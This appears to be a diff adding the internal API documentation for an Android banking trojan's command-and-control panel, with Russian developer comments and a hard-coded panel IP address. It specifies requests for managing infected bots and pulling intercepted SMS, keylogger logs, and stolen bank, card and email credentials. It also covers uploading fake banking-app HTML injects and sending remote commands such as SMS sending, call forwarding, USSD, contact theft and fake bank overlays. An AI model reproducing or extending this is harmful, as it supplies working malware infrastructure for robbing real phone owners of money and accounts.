@@ -1,0 +1,206 @@
+
+
+http://185.159.80.96/panel/restapi.php?params=base64_encode('{"request":"bots","currentPage":"1"}') // Пример
+
+
+
+
+
+ 	1) '{"request":"mainStats"}' //Буду переделывать(данные), пока забей!
+
+//---------------------Bots--------------------------------------------
+	2) '{"request":"getBots","currentPage":"1"}'   Пример1
+
+	3) '{"request":"getBotsFull","idbot":"IDBOT"}'   Пример2
+
+	4) '{"request":"deleteBots","idbot":"idbot1,idbot2,.."}'  
+
+	5) '{"request":"botsSetCommand","idbot":"idbot1,idbot2,..","command":"base64_encode("command")"}'    // установить команду для бот(а,ов)
+	
+	6) '{"request":"editComment","idbot":"123124","comment":"comment"}' //изменить комментарий в талб bots
+
+
+
+//--------------------Данные перехваченных СМС--------------------
+ 	7) '{"request":"getLogsSMS","idbot":""}'
+	
+	8) '{"request":"deleteLogsSMS","idbot":""}'
+
+
+
+//--------------------Данные c кейлоггера--------------------
+	9) '{"request":"getLogsKeylogger","idbot":""}'
+		
+	10) '{"request":"deleteLogsKeylogger","idbot":""}'
+
+
+
+//--------------------Индивидуальные(личные) настройки ботов------------------
+	11) '{"request":"editBotSettings","idbot":"123123","hideSMS":"1","lockDevice":"1","offSound":"1","keylogger":"1","activeInjection":":inj1:inj2"}' //Личные Настройки бота!
+		
+	12) '{"request":"getBotSettings","idbot":"123123"}' //Получить личные Настройки бота!
+
+
+
+
+//-------------------Логи банков, карт и почт-----------------------------------
+	13) '{"request":"getLogsBank","idbot":"123123"}' OR '{"request":"getLogsBank"}'   Пример3
+
+	14) '{"request":"getLogsCC","idbot":"123123"}' OR {"request":"getLogsCC"}' Пример3
+
+	15) '{"request":"getLogsMail","idbot":"123123"}' OR '{"request":"getLogsMail"}' Пример3
+
+	16) '{"request":"editCommentLogsBank","idinj":"qweqweqwe","comment":""}' // комментарии в таблице логов банка
+		
+	17) '{"request":"editCommentLogsCC","idinj":"qweqweqwe","comment":""}'// комментарии в таблице логов СС
+		
+	18) '{"request":"editCommentLogsMail","idinj":"qweqweqwe","comment":""}'// комментарии в таблице логов почт
+		
+	19) '{"request":"deleteLogsBank","idinj":"asdasdasd"}'
+		
+	20) '{"request":"deleteLogsCC","idinj":"asdasdasd"}'
+		
+	21) '{"request":"deleteLogsMail","idinj":"asdasdasd"}'
+
+
+
+
+//---------------------------Лист всех инжектов(банки, сс и почты)--------------------------------
+	22) '{"request":"getHtmlInjection"}' // Лист всех инжектов
+	
+	23) '{"request":"addHtmlInjection","app":"","html":"","icon":""}' //добавляем новый инжект, html в base64_encode("HTML инжекта"), 
+											      icon в base64_encode(FILE) формат jpeg/jpg/png;
+		
+	24) '{"request":"deleteHtmlInjection","app":""}'
+
+	
+
+//-------------------------Глобальные настройки---------------------------------------------
+//---- буду добавлять инфу, делай пока так, потом добавим!
+	
+	25) '{"request":"editGlobalSettings","arrayUrl":"урл1,урл2,урл3","timeInject":"10","timeCC":"20","timeMail":"30"}'
+		 
+	26) '{"request":"getGlobalSettings"}'
+
+
+
+
+//------------------------------------------------------------------------------------------
+
+
+
+------------Пример1: 
+{ 
+ "bots":[
+	       {"id":"qwerwtyetyfesd",   
+		"version":"9.0",  
+		"tag":"TEST", 
+		"country":"us", 
+		"banks":":com.paypal.android.p2pmobile:com.htsu.hsbcpersonalbanking", 
+		"lastConnect":"14191625",
+		"dateInfection":"2018-10-30",
+		"comment":"TEXT COMMENT",
+		"statProtect":"1",   // если 1 то протект выключен, если 2 то не определенно, иначе - включен!
+		"statScreen":"1",  // если 1 то холдер смотрит в тел, иначе - нет!
+		"statAccessibility":"1", // если 1 вкл, иначе выкл(Спец возможности)
+		"statCards":"1", // сработка инжект карт!
+		"statBanks":"1", // сработка инжект банка!
+		"statMails":"1", // сработка инжект почты!
+		"statAdmin":"1"} // админ права
+	],
+ "pages":"10",
+ "currentPage":"2"
+}
+		
+
+------------Пример2:     FULL!
+{
+		"id":"fdjhnslkfhksdfhfddfg",
+		"version":"8.1",
+		"tag":"And1",
+		"country":"us",
+		"banks":":usbank:sdasd",
+		"lastConnect":"",
+		"dateInfection":"2018-10-30 07:39",
+		"ip":"123123123",
+		"operator":"",
+		"model":"",
+		"phoneNumber":"2",//не на всех девайсах удается определить, по этому будем инжектить его!
+		"commands":"{asdasfasdf}",
+		"comment":"",
+		"statProtect":"1",
+		"statScreen":"1",
+		"statAccessibility":"1",
+		"statSMS":"1", // если 1 вкл, иначе выкл (Скрытый перехват смс)
+		"statCards":"1",
+		"statBanks":"1",
+		"statMails":"1",
+		"activeDevice":"23",// Это обрезанный шагомер , при активном движение девайса он считает счетчик int t++;
+		"timeWorking":"23",// время работы бота, именно работы фоновых сервисов! (В секундах)
+		"statDownloadModule":"1",  //скачался ли динамеческий модуль
+		"statAdmin":"1",
+		"updateSettings":"1"//Обновил ли настройки бот, если не обновил то 1!
+}
+
+-------------------------
+
+
+------------Пример3:
+{
+"logsBanks":
+	[
+	  {"idinj":"qwdasfqf1","idbot":"qwe1","application":"aaaa","logs":"JSON_BASE64","comment":"Comment1"},
+	  {"idinj":"adfhsdfh2","idbot":"qwe1","application":"aaaa","logs":"JSON_BASE64","comment":"Comment2"}
+	]
+}
+
+logs - переводишь с base64 и получаешься json
+
+все тоже самое с getLogsCC и getLogsMail
+
+statDownloadModule - 1 есть боевой модуль(тут весь функционал), иначе нет!
+statSMS - 1 скрытый перехват смс, иначе простой!
+statProtect - 0 выключен, 1 включен, 2 неизвестно!
+statBanks - если 1 то у данного бота есть лог банка!
+statCards - если 1 то у данного бота есть лог CC!
+statMails - если 1 то у данного бота есть лог почты!
+updateSettings - состояние личных настроек, тоесть мы изменили настройки для бота(включили скрый перехват смс и т д) ставится значение 1, как только бот получил эти данные то 0
+можно просто обозначить галкой что обновил!
+activeDevice - активность девайса, если телефон физиче двигаетсЯ то считаешься счетчик +1, чем больше число, тем больше холдер ходит и т д
+timeWorking - считает время работу фонов сервисом, ну грубо говоря считает секунды времени после инсталла бота
+
+
+
+Это запрос в restapi: {"request":"botsSetCommand","idbot":"idbot1,idbot2,..","command":"JSON_BASE64_ENCODE_COMMAND"}
+
+
+
+JSON_BASE64_COMMAND: 
+
+Отправка СМС - {"this":"~command~","name":"sendSms","number":"+123456789","text":"hi bro!"}
+////
+USSD - {"this":"~command~","name":"startUssd","ussd":"*100#"}
+///
+Переардесация звонка - {"this":"~command~","name":"forwardCall","number":"+123456789"}
+	/////
+Push - {"this":"~command~","name":"push","app":"com.bank.us","title":"hook","text":"book"}
+Auto Push  - {"this":"~command~","name":"autopush"}
+	/////
+	Запрос контактов  -  {"this":"~command~","name":"getContacts"}
+	///
+
+	Запрос установленных приложений  -  {"this":"~command~","name":"getInstallApps"}
+	///
+	Запрос СМС  -  {"this":"~command~","name":"getSMS"}
+///
+Открыть фейк банка  -  {"this":"~command~","name":"startInject","app":"com.bank.us"}
+///
+Удалить бот  -  {"this":"~command~","name":"killMe"}
+///
+Удалить приложение  -  {"this":"~command~","name":"deleteApp","app":"com.bank.us"}
+Открыть ссылку в браузере  -  {"this":"~command~","name":"openUrl","url":"https://yandex.ru"}
+Запустить установленное приложение  -  {"this":"~command~","name":"startApp","app":"com.bank.us"}
+
+
+
+{"request":"editGlobalSettings","arrayUrl":"урл1,урл2,урл3","timeInject":"10","timeCC":"20","timeMail":"30","updateTableBots":"5","pushTitle":"title","pushText":"text"}
